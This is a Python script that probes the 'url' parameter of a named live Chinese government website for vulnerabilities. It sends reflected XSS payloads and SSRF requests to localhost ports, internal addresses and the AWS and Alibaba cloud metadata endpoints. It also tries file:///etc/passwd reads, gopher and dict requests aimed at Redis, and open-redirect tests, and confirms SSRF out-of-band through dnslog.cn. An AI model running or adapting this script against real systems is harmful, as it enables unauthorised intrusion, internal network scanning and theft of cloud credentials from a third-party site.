import requests
import time
import re
import urllib.parse
import gzip

TARGET = "http://www.pingdu.qdjcy.gov.cn/"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/5.0",
    "Accept": "*/*",
    "Accept-Language": "en",
    "Accept-Encoding": "gzip",
    "Host": "www.pingdu.qdjcy.gov.cn",
    "Connection": "close",
}

def make_request(url_param=None, timeout=15):
    try:
        url = TARGET
        if url_param is not None:
            url = TARGET + "?url=" + urllib.parse.quote(url_param, safe="")
        start = time.time()
        resp = requests.get(url, headers=HEADERS, timeout=timeout, allow_redirects=False, verify=False)
        elapsed = time.time() - start
        text = resp.text
        return {
            "status": resp.status_code,
            "length": len(text),
            "time": round(elapsed, 3),
            "text": text,
            "headers": dict(resp.headers),
            "raw_headers": str(resp.headers),
        }
    except Exception as e:
        return {"status": "ERROR", "error": str(e), "length": 0, "time": 0, "text": "", "headers": {}, "raw_headers": ""}

def print_result(label, result, show_text=False, search_terms=None):
    status = result.get("status", "?")
    length = result.get("length", 0)
    elapsed = result.get("time", 0)
    print(f"  [{status}] 长度:{length} 耗时:{elapsed}s  - {label}")
    if search_terms and result.get("text"):
        for term in search_terms:
            if term.lower() in result["text"].lower():
                print(f"    !! 在响应中发现: {term}")
    if show_text and result.get("text"):
        text = result["text"]
        print(f"    响应前500字符: {text[:500]}")

def main():
    import urllib3
    urllib3.disable_warnings()

    print("=" * 60)
    print("  漏洞验证: www.pingdu.qdjcy.gov.cn url 参数")
    print("=" * 60)

    print("\n[1] 基线请求 (无url参数)")
    baseline = make_request(None)
    print_result("基线", baseline)
    base_len = baseline.get("length", 0)
    base_time = baseline.get("time", 0)

    print(f"\n    基线响应长度: {base_len} 字节, 耗时: {base_time}s")

    print("\n" + "=" * 60)
    print("[2] XSS 反射测试")
    print("=" * 60)

    xss_payloads = [
        ("简单字符串", "test123456"),
        ("script标签", "<script>alert(1)</script>"),
        ("img标签", "<img src=x onerror=alert(1)>"),
        ("img OAST", '<img src="http://test.oast.site/test">'),
        ("双引号闭合", '"><script>alert(1)</script>'),
        ("javascript伪协议", "javascript:alert(1)"),
    ]

    for label, payload in xss_payloads:
        result = make_request(payload)
        print_result(label, result, search_terms=[payload])
        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("[3] SSRF 测试 (内网/本地)")
    print("=" * 60)

    ssrf_payloads = [
        ("localhost:80", "http://127.0.0.1:80"),
        ("localhost:443", "http://127.0.0.1:443"),
        ("localhost:22", "http://127.0.0.1:22"),
        ("localhost:8080", "http://127.0.0.1:8080"),
        ("内网192.168.1.1", "http://192.168.1.1"),
        ("内网10.0.0.1", "http://10.0.0.1"),
        ("云元数据AWS", "http://169.254.169.254/latest/meta-data/"),
        ("云元数据阿里云", "http://100.100.100.200/latest/meta-data/"),
    ]

    ssrf_results = []
    for label, payload in ssrf_payloads:
        result = make_request(payload, timeout=10)
        print_result(label, result)
        ssrf_results.append((label, result))
        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("[4] 协议/方案测试")
    print("=" * 60)

    scheme_payloads = [
        ("file协议", "file:///etc/passwd"),
        ("file协议win", "file:///C:/Windows/System32/drivers/etc/hosts"),
        ("gopher协议", "gopher://127.0.0.1:6379/_INFO"),
        ("dict协议", "dict://127.0.0.1:6379/INFO"),
        ("ftp协议", "ftp://127.0.0.1:21"),
        ("https", "https://www.baidu.com"),
        ("http baidu", "http://www.baidu.com"),
    ]

    for label, payload in scheme_payloads:
        result = make_request(payload, timeout=10)
        print_result(label, result)
        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("[5] 重定向测试")
    print("=" * 60)

    redirect_payloads = [
        ("正常URL", "http://www.baidu.com"),
        ("相对路径", "/html/sygk/"),
        ("//协议相对", "//www.baidu.com"),
    ]

    for label, payload in redirect_payloads:
        result = make_request(payload, timeout=10)
        status = result.get("status", "?")
        length = result.get("length", 0)
        elapsed = result.get("time", 0)
        print(f"  [{status}] 长度:{length} 耗时:{elapsed}s  - {label}")
        if status in [301, 302, 303, 307, 308]:
            loc = result.get("headers", {}).get("Location", "")
            print(f"    Location: {loc}")
        if length and abs(length - base_len) > 500:
            print(f"    !! 响应长度差异较大 ({length} vs {base_len})，可能内容被替换")
        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("[6] 详细响应分析（搜索url参数值是否出现在页面中）")
    print("=" * 60)

    test_str = "XSS_TEST_MARKER_998877"
    result = make_request(test_str)
    if test_str in result.get("text", ""):
        print(f"  !! 确认: url参数值直接反射在响应中（找到标记 {test_str}）")
        text = result["text"]
        idx = text.find(test_str)
        start = max(0, idx - 100)
        end = min(len(text), idx + 100)
        print(f"    上下文: ...{text[start:end]}...")
    else:
        print(f"  - url参数值未在响应中直接反射")

    print("\n" + "=" * 60)
    print("[7] DNS OAST SSRF 验证 (dnslog.cn)")
    print("=" * 60)

    try:
        # 获取dnslog子域名
        dnslog_resp = requests.get("http://www.dnslog.cn/getdomain.php", timeout=10)
        if dnslog_resp.status_code == 200 and "." in dnslog_resp.text:
            dnslog_domain = dnslog_resp.text.strip()
            print(f"  获取DNSLog域名: {dnslog_domain}")

            # 构造SSRF payload
            ssrf_payload = f"http://{dnslog_domain}/test_ssrf"
            print(f"  发送SSRF请求: {ssrf_payload}")
            make_request(ssrf_payload, timeout=10)

            # 等待并检查DNS记录
            print("  等待DNS解析记录...")
            time.sleep(5)

            check_resp = requests.get("http://www.dnslog.cn/getrecords.php", timeout=10)
            if check_resp.status_code == 200 and dnslog_domain in check_resp.text:
                print(f"  !! SSRF确认: DNSLog收到解析记录!")
                print(f"     响应内容: {check_resp.text[:500]}")
            else:
                print(f"  - 未检测到DNS解析记录（SSRF可能不存在，或需要更长等待时间）")
        else:
            print(f"  - 无法获取DNSLog域名 (状态码: {dnslog_resp.status_code})")
    except Exception as e:
        print(f"  - DNSLog服务不可用: {e}")

    print("\n" + "=" * 60)
    print("[8] 最终分析总结")
    print("=" * 60)

    print(f"\n基线响应长度: {base_len} 字节, 耗时: {base_time}s")
    
    # 检测是否存在反射
    xss_reflected = False
    for label, payload in xss_payloads:
        result = make_request(payload)
        if payload in result.get("text", ""):
            xss_reflected = True
            print(f"\n  [XSS反射] {label}: payload在响应中出现")
            break
    
    if not xss_reflected:
        print("\n  [XSS] 未发现明显的参数值反射")

    # SSRF判断基于响应时间和长度差异
    print("\n  [SSRF] 各测试响应差异分析:")
    for label, result in ssrf_results:
        length = result.get("length", 0)
        elapsed = result.get("time", 0)
        len_diff = length - base_len if length else 0
        time_diff = elapsed - base_time
        if length and abs(len_diff) > 100:
            print(f"    {label}: 长度差异={len_diff} ({length}) 时间差异={time_diff:.2f}s")

    print("\n验证完成。")

if __name__ == "__main__":
    main()
